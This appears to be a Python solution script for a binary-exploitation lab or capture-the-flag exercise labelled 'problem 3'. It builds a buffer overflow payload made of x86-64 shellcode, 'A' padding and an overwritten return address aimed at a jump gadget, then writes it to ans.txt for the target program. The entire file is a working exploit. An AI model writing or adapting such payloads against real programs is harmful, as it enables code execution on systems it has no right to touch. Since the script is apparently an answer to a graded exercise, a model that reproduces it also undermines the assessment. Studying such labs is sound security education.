import struct
shellcode = b"\xbf\x72\x00\x00\x00" + b"\x48\xc7\xc0\x16\x12\x40\x00" + b"\xff\xd0"
padding_len = 40 - len(shellcode)
padding = b"A" * padding_len
jmp_xs_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00"
payload = shellcode + padding + jmp_xs_addr
with open("ans.txt", "wb") as f:
    f.write(payload)
print("Problem 3 payload generated. Run: ./problem3 ans.txt")